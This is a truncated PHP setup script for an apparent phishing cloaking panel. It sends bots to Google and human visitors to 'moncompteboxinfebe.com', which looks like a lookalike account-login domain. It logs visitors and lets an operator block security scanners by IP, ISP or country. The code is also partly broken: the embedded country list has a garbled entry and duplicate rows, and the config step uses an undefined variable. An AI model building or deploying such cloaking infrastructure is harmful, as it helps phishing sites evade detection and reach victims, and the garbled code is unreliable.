<?php
// Enable error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Check if the setup process has been initiated
$step = isset($_GET['step']) ? intval($_GET['step']) : 0;
$completed = [];

// Function to check if a step is completed
function isStepCompleted($step_number) {
    global $completed;
    return in_array($step_number, $completed);
}

// Default redirect URLs
$default_redirect_url = 'https://www.google.com';
$default_bot_redirect_url = 'https://www.google.com';
$default_human_redirect_url = 'https://moncompteboxinfebe.com';

// Create necessary directories if they don't exist
$directories = [
    'include',
    'data',
    'assets',
    'assets/sounds',
    'assets/images',
    'assets/js',
    'assets/css',
    'dash'
];

foreach ($directories as $dir) {
    if (!file_exists($dir)) {
        mkdir($dir, 0755, true);
    }
}

// Handle clear visitor logs action
if (isset($_GET['action']) && $_GET['action'] === 'clear_visitor_logs') {
  $log_file = 'data/visitor_log.txt';
  $visitors_json = 'data/visitors.json';
  $blocked_json = 'data/blocked.json';
  
  // Clear visitor log
  if (file_exists($log_file)) {
      file_put_contents($log_file, ''); // Clear the file
  }
  
  // Clear visitors.json
  if (file_exists($visitors_json)) {
      file_put_contents($visitors_json, '[]');
  }
  
  // Reset blocked.json to empty lists but keep structure
  if (file_exists($blocked_json)) {
      $empty_blocked = [
          'blocked_ips' => [],
          'blocked_isps' => []
      ];
      file_put_contents($blocked_json, json_encode($empty_blocked, JSON_PRETTY_PRINT));
  }
  
  // Regenerate panel.html with empty data
  if (file_exists('include/panel_template.php')) {
      ob_start();
      include('include/panel_template.php');
      $content = ob_get_clean();
      
      if (!file_exists('dash')) {
          mkdir('dash', 0755, true);
      }
      
      file_put_contents('dash/index.php', $content);
  }
  
  echo json_encode(['success' => true, 'message' => 'All visitor logs have been cleared successfully.']);
  exit;
}

// Handle get visitor logs action
if (isset($_GET['action']) && $_GET['action'] === 'get_visitor_logs') {
    $log_file = 'data/visitor_log.txt';
    $logs = [];
    if (file_exists($log_file)) {
        $log_content = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($log_content as $line) {
            $decoded = json_decode($line, true);
            if ($decoded) {
                $logs[] = $decoded;
            }
        }
    }
    echo json_encode($logs);
    exit;
}

// Handle block IP action
if (isset($_GET['action']) && substr($_GET['action'], 0, 6) === 'block_') {
    $type = substr($_GET['action'], 6);
    $value = $_GET['value'] ?? '';
    
    if (!in_array($type, ['ip', 'isp'])) {
        echo json_encode(['success' => false, 'message' => 'Invalid block type.']);
        exit;
    }
    
    $blocked_file = 'data/blocked.json';
    $blocked_data = [];
    
    if (file_exists($blocked_file)) {
        $blocked_data = json_decode(file_get_contents($blocked_file), true);
    }
    
    if (!isset($blocked_data["blocked_{$type}s"])) {
        $blocked_data["blocked_{$type}s"] = [];
    }
    
    if (!in_array($value, $blocked_data["blocked_{$type}s"])) {
        $blocked_data["blocked_{$type}s"][] = $value;
        file_put_contents($blocked_file, json_encode($blocked_data, JSON_PRETTY_PRINT));
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => "{$type} already blocked."]);
    }
    exit;
}

// Handle unblock IP action
if (isset($_GET['action']) && substr($_GET['action'], 0, 8) === 'unblock_') {
    $type = substr($_GET['action'], 8);
    $value = $_GET['value'] ?? '';
    
    if (!in_array($type, ['ip', 'isp'])) {
        echo json_encode(['success' => false, 'message' => 'Invalid unblock type.']);
        exit;
    }
    
    $blocked_file = 'data/blocked.json';
    if (file_exists($blocked_file)) {
        $blocked_data = json_decode(file_get_contents($blocked_file), true);
        
        if (isset($blocked_data["blocked_{$type}s"])) {
            $key = array_search($value, $blocked_data["blocked_{$type}s"]);
            if ($key !== false) {
                unset($blocked_data["blocked_{$type}s"][$key]);
                $blocked_data["blocked_{$type}s"] = array_values($blocked_data["blocked_{$type}s"]); // Reindex array
                file_put_contents($blocked_file, json_encode($blocked_data, JSON_PRETTY_PRINT));
                echo json_encode(['success' => true]);
                exit;
            }
        }
    }
    
    echo json_encode(['success' => false, 'message' => "{$type} not found in blocked list."]);
    exit;
}

// Create required files if they don't exist
if (!file_exists('data/blocked.json')) {
    file_put_contents('data/blocked.json', json_encode([
        'blocked_ips' => [],
        'blocked_isps' => []
    ], JSON_PRETTY_PRINT));
}

if (!file_exists('data/config.json')) {
    file_put_contents('data/config.json', json_encode([
        'bot_redirect' => $default_bot_redirect_url,
        'human_redirect' => $default_human_redirect_url,
        'blocked_redirect' => $default_redirect_url,
        'country_mode' => 'allow_all',
        'allowed_countries' => [],
        'blocked_countries' => []
    ], JSON_PRETTY_PRINT));
}

if (!file_exists('data/visitor_log.txt')) {
    file_put_contents('data/visitor_log.txt', '');
}

// Find the section where you create files and add this code to copy the favicon

// Create notification sound file if it doesn't exist
if (!file_exists('assets/sounds/notification.mp3')) {
    // Create assets/sounds directory if it doesn't exist
    if (!file_exists('assets/sounds')) {
        mkdir('assets/sounds', 0755, true);
    }
    
    // Download and save the notification sound
    $notification_sound = file_get_contents('https://hebbkx1anhila5yf.public.blob.vercel-storage.com/notification-YPxeYJESIv0Gu388vOfX3OGMuNWnIY.mp3');
    if ($notification_sound) {
        file_put_contents('assets/sounds/notification.mp3', $notification_sound);
        echo "Created notification sound file<br>";
    }
}

// Create favicon if it doesn't exist
if (!file_exists('favicon.gif')) {
    // Copy the favicon from the source or create a new one
    $favicon_data = file_get_contents('https://hebbkx1anhila5yf.public.blob.vercel-storage.com/chat-bot-vjjZ6XH2tBSJpj9hxPd91pA2dFtie5.png');
    if ($favicon_data) {
        file_put_contents('favicon.gif', $favicon_data);
        echo "Created favicon.gif<br>";
    }
}

// Create a modern login template if it doesn't exist
if (!file_exists('include/login_template.php')) {
    $login_template = <<<'EOD'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Visitor Tracking System</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #4f46e5;
            --primary-light: #6366f1;
            --primary-dark: #4338ca;
            --danger: #ef4444;
            --dark: #1f2937;
            --gray: #6b7280;
            --gray-light: #e5e7eb;
            --border-radius: 0.5rem;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Inter", sans-serif;
            background-color: #f3f4f6;
            color: var(--dark);
            line-height: 1.5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 1rem;
        }
        
        .login-container {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-lg);
            width: 100%;
            max-width: 400px;
            padding: 2rem;
            text-align: center;
        }
        
        .login-logo {
            font-size: 3rem;
            color: var(--primary);
            margin-bottom: 1rem;
        }
        
        .login-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: var(--dark);
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }
        
        .form-group {
            text-align: left;
        }
        
        .form-label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            color: var(--dark);
        }
        
        .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .login-button {
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            padding: 0.75rem 1rem;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .login-button:hover {
            background-color: var(--primary-dark);
        }
        
        .error-message {
            color: var(--danger);
            font-size: 0.875rem;
            margin-top: 0.5rem;
            text-align: left;
        }
        
        .password-toggle {
            position: relative;
        }
        
        .password-toggle-icon {
            position: absolute;
            right: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray);
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-logo">
            <i class="fas fa-chart-line"></i>
        </div>
        <h1 class="login-title">Visitor Tracking System</h1>
        
        <form class="login-form" method="POST" action="">
            <?php if (isset($error) && $error): ?>
                <div class="error-message">
                    <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>
            
            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <div class="password-toggle">
                    <input type="password" id="password" name="password" class="form-input" required>
                    <i class="fas fa-eye password-toggle-icon" id="togglePassword"></i>
                </div>
            </div>
            
            <button type="submit" class="login-button">Login</button>
        </form>
    </div>

    <script>
        // Toggle password visibility
        const togglePassword = document.getElementById("togglePassword");
        const passwordInput = document.getElementById("password");
        
        togglePassword.addEventListener("click", function() {
            const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
            passwordInput.setAttribute("type", type);
            this.classList.toggle("fa-eye");
            this.classList.toggle("fa-eye-slash");
        });
    </script>
</body>
</html>
EOD;
    file_put_contents('include/login_template.php', $login_template);
}

// Create security .htaccess file for data directory
if (!file_exists('data/.htaccess')) {
    $htaccess_content = <<<'EOD'
# Deny access to all files in this directory
<FilesMatch ".*">
    Order Allow,Deny
    Deny from all
</FilesMatch>

# Prevent directory listing
Options -Indexes

# Disable script execution
<FilesMatch "\.(php|pl|py|jsp|asp|htm|html|shtml|sh|cgi)$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

# Prevent access to sensitive files
<FilesMatch "^(\.htaccess|\.htpasswd|\.git|\.env|\.config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
EOD;
    file_put_contents('data/.htaccess', $htaccess_content);
}

// Create security .htaccess file for include directory
if (!file_exists('include/.htaccess')) {
    file_put_contents('include/.htaccess', $htaccess_content);
}

// Create a JavaScript file for country selection
if (!file_exists('assets/js/countries.js')) {
    $countries_js = <<<'EOD'
// Countries list with ISO codes for flags
const countries = [
    { code: "af", name: "Afghanistan" },
    { code: "ax", name: "Åland Islands" },
    { code: "al", name: "Albania" },
    { code: "dz", name: "Algeria" },
    { code: "as", name: "American Samoa" },
    { code: "ad", name: "Andorra" },
    { code: "ao", name: "Angola" },
    { code: "ai", name: "Anguilla" },
    { code: "aq", name: "Antarctica" },
    { code: "ag", name: "Antigua and Barbuda" },
    { code: "ar", name: "Argentina" },
    { code: "am", name: "Armenia" },
    { code: "aw", name: "Aruba" },
    { code: "au", name: "Australia" },
    { code: "at", name: "Austria" },
    { code: "az", name: "Azerbaijan" },
    { code: "bs", name: "Bahamas" },
    { code: "bh", name: "Bahrain" },
    { code: "bd", name: "Bangladesh" },
    { code: "bb", name: "Barbados" },
    { code: "by", name: "Belarus" },
    { code: "be", name: "Belgium" },
    { code: "bz", name: "Belize" },
    { code: "bj", name: "Benin" },
    { code: "bm", name: "Bermuda" },
    { code: "bt", name: "Bhutan" },
    { code: "bo", name: "Bolivia" },
    { code: "bq", name: "Bonaire, Sint Eustatius and Saba" },
    { code: "ba", name: "Bosnia and Herzegovina" },
    { code: "bw", name: "Botswana" },
    { code: "bv", name: "Bouvet Island" },
    { code: "br", name: "Brazil" },
    { code: "io", name: "British Indian Ocean Territory" },
    { code: "bn", name: "Brunei Darussalam" },
    { code: "bg", name: "Bulgaria" },
    { code: "bf", name: "Burkina Faso" },
    { code: "bi", name: "Burundi" },
    { code: "cv", name: "Cabo Verde" },
    { code: "kh", name: "Cambodia" },
    { code: "cm", name: "Cameroon" },
    { code: "ca", name: "Canada" },
    { code: "ky", name: "Cayman Islands" },
    { code: "cf", name: "Central African Republic" },
    { code: "td", name: "Chad" },
    { code: "cl", name: "Chile" },
    { code: "cn", name: "China" },
    { code: "cx", name: "Christmas Island" },
    { code: "cc", name: "Cocos (Keeling) Islands" },
    { code: "co", name: "Colombia" },
    { code: "km", name: "Comoros" },
    { code: "cg", name: "Congo" },
    { code: "cd", name: "Congo, Democratic Republic of the" },
    { code: "ck", name: "Cook Islands" },
    { code: "cr", name: "Costa Rica" },
    { code: "ci", name: "Côte d'Ivoire" },
    { code: "hr", name: "Croatia" },
    { code: "cu", name: "Cuba" },
    { code: "cw", name: "Curaçao" },
    { code: "cy", name: "Cyprus" },
    { code: "cz", name: "Czechia" },
    { code: "dk", name: "Denmark" },
    { code: "dj", name: "Djibouti" },
    { code: "dm", name: "Dominica" },
    { code: "do", name: "Dominican Republic" },
    { code: "ec", name: "Ecuador" },
    { code: "eg", name: "Egypt" },
    { code: "sv", name: "El Salvador" },
    { code: "gq", name: "Equatorial Guinea" },
    { code: "er", name: "Eritrea" },
    { code: "ee", name: "Estonia" },
    { code: "sz", name: "Eswatini" },
    { code: "et", name: "Ethiopia" },
    { code: "fk", name: "Falkland Islands (Malvinas)" },
    { code: "fo", name: "Faroe Islands" },
    { code: "fj", name: "Fiji" },
    { code: "fi", name: "Finland" },
    { code: "fr", name: "France" },
    { code: "gf", name: "French Guiana" },
    { code: "pf", name: "French Polynesia" },
    { code: "tf", name: "French Southern Territories" },
    { code: "ga", name: "Gabon" },
    { code: "gm", name: "Gambia" },
    { code: "ge", name: "Georgia" },
    { code: "de", name: "Germany" },
    { code: "gh", name: "Ghana" },
    { code: "gi", name: "Gibraltar" },
    { code: "gr", name: "Greece" },
    { code: "gl", name: "Greenland" },
    { code: "gd", name: "Grenada" },
    { code: "gp", name: "Guadeloupe" },
    { code: "gu", name: "Guam" },
    { code: "gt", name: "Guatemala" },
    { code: "gg", name: "Guernsey" },
    { code: "gn", name: "Guinea" },
    { code: "gw", name: "Guinea-Bissau" },
    { code: "gy", name: "Guyana" },
    { code: "ht", name: "Haiti" },
    { code: "hm", name: "Heard Island and McDonald Islands" },
    { code: "va", name: "Holy See" },
    { code: "hn", name: "Honduras" },
    { code: "hk", name: "Hong Kong" },
    { code: "hu", name: "Hungary" },
    { code: "is", name: "Iceland" },
    { code: "in", name: "India" },
    { code: "id", name: "Indonesia" },
    { code: "ir", name: "Iran" },
    { code: "iq", name: "Iraq" },
    { code: "ie", name: "Ireland" },
    { code: "im", name: "Isle of Man" },
    { code: "il", name: "Israel" },
    { code: "it", name: "Italy" },
    { code: "jm", name: "Jamaica" },
    { code: "jp", name: "Japan" },
    { code: "je", name: "Jersey" },
    { code: "jo", name: "Jordan" },
    { code: "kz", name: "Kazakhstan" },
    { code: "ke", name: "Kenya" },
    { code: "ki", name: "Kiribati" },
    { code: "kp", name: "Korea, Democratic People's Republic of" },
    { code: "kr", name: "Korea, Republic of" },
    { code: "kw", name: "Kuwait" },
    { code: "kg", name: "Kyrgyzstan" },
    { code: "la", name: "Lao People's Democratic Republic" },
    { code: "lv", name: "Latvia" },
    { code: "lb", name: "Lebanon" },
    { code: "ls", name: "Lesotho" },
    { code: "lr", name: "Liberia" },
    { code: "ly", name: "Libya" },
    { code: "li", name: "Liechtenstein" },
    { code: "lt", name: "Lithuania" },
    { code: "lu", name: "Luxembourg" },
    { code: "mo", name: "Macao" },
    { code: "mg", name: "Madagascar" },
    { code: "mw", name: "Malawi" },
    { code: "my", name: "Malaysia" },
    { code: "mv", name: "Maldives" },
    { code: "ml", name: "Mali" },
    { code: "mt", name: "Malta" },
    { code: "mh", name: "Marshall Islands" },
    { code: "mq", name: "Martinique" },
    { code: "mr", name: "Mauritania" },
    { code: "mu", name: "Mauritius" },
    { code: "yt", name: "Mayotte" },
    { code: "mx", name: "Mexico" },
    { code: "fm", name: "Micronesia" },
    { code: "md", name: "Moldova" },
    { code: "mc", name: "Monaco" },
    { code: "mn", name: "Mongolia" },
    { code: "me", name: "Montenegro" },
    { code: "ms", name: "Montserrat" },
    { code: "ma", name: "Morocco" },
    { code: "mz", name: "Mozambique" },
    { code: "mm", name: "Myanmar" },
    { code: "na", name: "Namibia" },
    { code: "nr", name: "Nauru" },
    { code: "np", name: "Nepal" },
    { code: "nl", name: "Netherlands" },
    { code: "nc", name: "New Caledonia" },
    { code: "nz", name: "New Zealand" },
    { code: "ni", name: "Nicaragua" },
    { code: "ne", name: "Niger" },
    { code: "ng", name: "Nigeria" },
    { code: "nu", name: "Niue" },
    { code: "nf", name: "Norfolk Island" },
    { code: "mk", name: "North Macedonia" },
    { code: "mp", name: "Northern Mariana Islands" },
    { code: "no", name: "Norway" },
    { code: "om", name: "Oman" },
    { code: "pk", name: "Pakistan" },
    { code: "pw", name: "Palau" },
    { code: "ps", name: "Palestine, State of" },
    { code: "pa", name: "Panama" },
    { code: "pg", name: "Papua New Guinea" },
    { code: "py", name: "Paraguay" },
    { code: "pe", name: "Peru" },
    { code: "ph", name: "Philippines" },
    { code: "pn", name: "Pitcairn" },
    { code: "pl", name: "Poland" },
    { code: "pt", name: "Portugal" },
    { code: "pr", name: "Puerto Rico" },
    { code: "qa", name: "Qatar" },
    { code: "re", name: "Réunion" },
    { code: "ro", name: "Romania" },
    { code: "ru", name: "Russian Federation" },
    { code: "rw", name: "Rwanda" },
    { code: "bl", name: "Saint Barthélemy" },
    { code: "sh", name: "Saint Helena, Ascension and Tristan da Cunha" },
    { code: "kn", name: "Saint Kitts and Nevis" },
    { code: "lc", name: "Saint Lucia" },
    { code: "mf", name: "Saint Martin (French part)" },
    { code: "pm", name: "Saint Pierre and Miquelon" },
    { code: "vc", name: "Saint Vincent and the Grenadines" },
    { code: "ws", name: "Samoa" },
    { code: "sm", name: "San Marino" },
    { code: "st", name: "Sao Tome and Principe" },
    { code: "sa", name: "Saudi Arabia" },
    { code: "sn", name: "Senegal" },
    { code: "rs", name: "Serbia" },
    { code: "sc", name: "Seychelles" },
    { code: "sl", name: "Sierra Leone" },
    { code: "sg", name: "Singapore" },
    { code: "sx", name: "Sint Maarten (Dutch part)" },
    { code: "sk", name: "Slovakia" },
    { code: "si", name: "Slovenia" },
    { code: "sb", name: "Solomon Islands" },
    { code: "so", name: "Somalia" },
    { code: "za", name: "South Africa" },
    { code: "gs", name: "South Georgia and the South Sandwich Islands" },
    { code: "ss", name: "South Sudan" },
    { code: "es", name: "Spain" },
    { code: "lk", name: "Sri Lanka" },
    { code: "sd", name: "Sudan" },
    { code: "sr", name: "Suriname" },
    { code: "sj", name: "Svalbard and Jan Mayen" },
    { code: "se", name: "Sweden" },
    { code: "ch", name: "Switzerland" },
    { code: "sy", name: "Syrian Arab Republic" },
    { code: "tw", name: "Taiwan" },
    { code: "tj", name: "Tajikistan" },
    { code: "tz", name: "Tanzania, United Republic of" },
    { code: "th", name: "Thailand" },
    { code: "tl", name: "Timor-Leste" },
    { code: "tg", name: "Togo" },
    { code: "tk", name: "Tokelau" },
    { code: "to", name: "Tonga" },
    { code: "tt", name: "Trinidad and Tobago" },
    { code: "tn", name: "Tunisia" },
    { code: "tr", name: "Turkey" },
    { code: "tm", name: "Turkmenistan" },
    { code: "tc", name: "Turks and Caicos Islands" },
    { code: "tv", name: "Tuvalu" },
    { code: "ug", name: "Uganda" },
    { code: "ua", name: "Ukraine" },
    { code: "ae", name: "United Arab Emirates" },
    { code: "gb", name: "United Kingdom" },
    { code: "us", name: "United States" },
    { code: "um", name: "United States Minor Outlying Islands" },
    { code: "uy", name: "Uruguay" },
    { code: "uz", name: "Uzbekistan" },
    { code: "vu", name: "Vanuatu" },
    { code: "ve", name: "Venezuela" },
    { code: "vn", name: "Viet Nam" },
    { code: "  },
    { code: "ve", name: "Venezuela" },
    { code: "vn", name: "Viet Nam" },
    { code: "vg", name: "Virgin Islands, British" },
    { code: "vi", name: "Virgin Islands, U.S." },
    { code: "wf", name: "Wallis and Futuna" },
    { code: "eh", name: "Western Sahara" },
    { code: "ye", name: "Yemen" },
    { code: "zm", name: "Zambia" },
    { code: "zw", name: "Zimbabwe" }
];

// Function to populate country selection
function populateCountrySelection(selectElement, selectedCountries = []) {
    if (!selectElement) return;
    
    // Clear existing options
    selectElement.innerHTML = '';
    
    // Add countries with flags
    countries.forEach(country => {
        const option = document.createElement('option');
        option.value = country.code;
        option.text = country.name;
        option.selected = selectedCountries.includes(country.code);
        selectElement.appendChild(option);
    });
    
    // Initialize Select2 if available
    if (typeof $ !== 'undefined' && $.fn.select2) {
        $(selectElement).select2({
            templateResult: formatCountryOption,
            templateSelection: formatCountryOption
        });
    }
}

// Format country option with flag
function formatCountryOption(country) {
    if (!country.id) return country.text;
    
    const flagUrl = `https://flagcdn.com/16x12/${country.id.toLowerCase()}.png`;
    
    return $(`<span><img src="${flagUrl}" class="flag-icon" alt="${country.text} flag" /> ${country.text}</span>`);
}

// Function to get selected countries
function getSelectedCountries(selectElement) {
    const selected = [];
    
    for (let i = 0; i < selectElement.options.length; i++) {
        if (selectElement.options[i].selected) {
            selected.push(selectElement.options[i].value);
        }
    }
    
    return selected;
}

// Function to toggle country selection based on mode
function toggleCountrySelection(mode) {
    const countrySelectionContainer = document.getElementById('countrySelectionContainer');
    
    if (mode === 'allow_all') {
        countrySelectionContainer.style.display = 'none';
    } else {
        countrySelectionContainer.style.display = 'block';
    }
}

// Initialize country selection on page load
document.addEventListener('DOMContentLoaded', function() {
    const countrySelect = document.getElementById('allowed_countries');
    const countryMode = document.getElementById('country_mode');
    
    if (countrySelect && countryMode) {
        populateCountrySelection(countrySelect);
        toggleCountrySelection(countryMode.value);
        
        // Add event listener for mode change
        countryMode.addEventListener('change', function() {
            toggleCountrySelection(this.value);
        });
    }
});
EOD;
    file_put_contents('assets/js/countries.js', $countries_js);
}

// Main setup logic
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Redirect System Setup</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <style>
        :root {
            --primary: #4f46e5;
            --primary-light: #6366f1;
            --primary-dark: #4338ca;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1f2937;
            --gray: #6b7280;
            --gray-light: #e5e7eb;
            --border-radius: 0.5rem;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f3f4f6;
            color: var(--dark);
            line-height: 1.5;
            padding: 2rem;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-lg);
            overflow: hidden;
        }
        
        .header {
            background-color: var(--primary);
            color: white;
            padding: 2rem;
            text-align: center;
        }
        
        .title {
            font-size: 1.75rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }
        
        .subtitle {
            opacity: 0.9;
            font-size: 1rem;
        }
        
        .content {
            padding: 2rem;
        }
        
        .step {
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            transition: all 0.3s ease;
        }
        
        .step:hover {
            box-shadow: var(--shadow);
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .step-number {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 2rem;
            height: 2rem;
            background-color: var(--primary-light);
            color: white;
            border-radius: 50%;
            font-weight: 600;
            margin-right: 1rem;
        }
        
        .step-title {
            font-weight: 600;
            font-size: 1.25rem;
            flex: 1;
        }
        
        .step-content {
            margin-bottom: 1.5rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }
        
        .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .form-select {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            font-size: 1rem;
            background-color: white;
            transition: all 0.3s ease;
        }
        
        .form-select:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            padding: 0.75rem 1.5rem;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .button:hover {
            background-color: var(--primary-dark);
            transform: translateY(-1px);
        }
        
        .button i {
            margin-right: 0.5rem;
        }
        
        .success {
            background-color: #ecfdf5;
            color: #065f46;
            padding: 1rem;
            border-radius: var(--border-radius);
            border-left: 4px solid var(--success);
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
        }
        
        .success i {
            font-size: 1.25rem;
            margin-right: 0.75rem;
            color: var(--success);
        }
        
        .error {
            background-color: #fef2f2;
            color: #991b1b;
            padding: 1rem;
            border-radius: var(--border-radius);
            border-left: 4px solid var(--danger);
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
        }
        
        .error i {
            font-size: 1.25rem;
            margin-right: 0.75rem;
            color: var(--danger);
        }
        
        .info {
            background-color: #eff6ff;
            color: #1e40af;
            padding: 1rem;
            border-radius: var(--border-radius);
            border-left: 4px solid var(--info);
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
        }
        
        .info i {
            font-size: 1.25rem;
            margin-right: 0.75rem;
            color: var(--info);
        }
        
        .completed-step {
            border-color: var(--success);
            background-color: rgba(16, 185, 129, 0.05);
        }
        
        .completed-badge {
            display: inline-flex;
            align-items: center;
            background-color: var(--success);
            color: white;
            padding: 0.25rem 0.5rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            margin-left: 0.5rem;
        }
        
        .completed-badge i {
            margin-right: 0.25rem;
        }
        
        .flag-icon {
            width: 16px;
            height: 12px;
            margin-right: 0.5rem;
            vertical-align: middle;
            border-radius: 2px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        
        .select2-container {
            width: 100% !important;
        }
        
        .select2-container--default .select2-selection--multiple {
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            padding: 0.25rem;
        }
        
        .select2-container--default.select2-container--focus .select2-selection--multiple {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .footer {
            background-color: #f9fafb;
            border-top: 1px solid var(--gray-light);
            padding: 1.5rem 2rem;
            text-align: center;
            color: var(--gray);
            font-size: 0.875rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title"><i class="fas fa-chart-line"></i> IP Redirect System Setup</h1>
            <p class="subtitle">Complete the following steps to set up your visitor tracking and redirect system.</p>
        </div>
        
        <div class="content">
            <?php
            // Process form submissions
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                if (isset($_POST['step'])) {
                    $current_step = intval($_POST['step']);
                    
                    switch ($current_step) {
                        case 1:
                            // Setup directories
                            $success = true;
                            foreach ($directories as $dir) {
                                if (!file_exists($dir) && !mkdir($dir, 0755, true)) {
                                    $success = false;
                                    break;
                                }
                            }
                            
                            if ($success) {
                                $completed[] = 1;
                                $step = 2;
                                echo '<div class="success"><i class="fas fa-check-circle"></i> Directories created successfully.</div>';
                            } else {
                                echo '<div class="error"><i class="fas fa-exclamation-circle"></i> Failed to create directories. Please check the permissions.</div>';
                            }
                            break;
                            
                        case 2:
                            // Save redirect configuration
                            $human_redirect = filter_input(INPUT_POST, 'human_redirect', FILTER_SANITIZE_FULL_SPECIAL_CHARS) ?: $default_human_redirect_url;
                            $blocked_redirect = filter_input(INPUT_POST, 'blocked_redirect', FILTER_SANITIZE_FULL_SPECIAL_CHARS) ?: $default_redirect_url;
                            $blocked_redirect = filter_input(INPUT_POST, 'blocked_redirect', FILTER_SANITIZE_URL) ?: $default_redirect_url;
                            // Fix for deprecated FILTER_SANITIZE_STRING
                            $country_mode = isset($_POST['country_mode']) ? htmlspecialchars($_POST['country_mode'], ENT_QUOTES, 'UTF-8') : 'allow_all';
                            
                            // Get selected countries
                            $allowed_countries = isset($_POST['allowed_countries']) ? $_POST['allowed_countries'] : [];
                            
                            $config = [
                                'bot_redirect' => $bot_redirect,
                                'human_redirect' => $human_redirect,
                                'blocked_redirect' => $blocked_redirect,
                                'country_mode' => $country_mode,
                                'allowed_countries' => $allowed_countries
                            ];
                            
                            if (file_put_contents('data/config.json', json_encode($config, JSON_PRETTY_PRINT))) {
                                $completed[] = 2;
                                $step = 3;
                                echo '<div class="success"><i class="fas fa-check-circle"></i> Configuration saved successfully.</div>';
                            } else {
                                echo '<div class="error"><i class="fas fa-exclamation-circle"></i> Failed to save configuration. Please check the permissions.</div>';
                            }
                            break;
                            
                        case 3:
                            // Finalize installation
                            $success = true;
                            
                            // Copy panel_template.php if it exists
                            if (file_exists('panel_template.php')) {
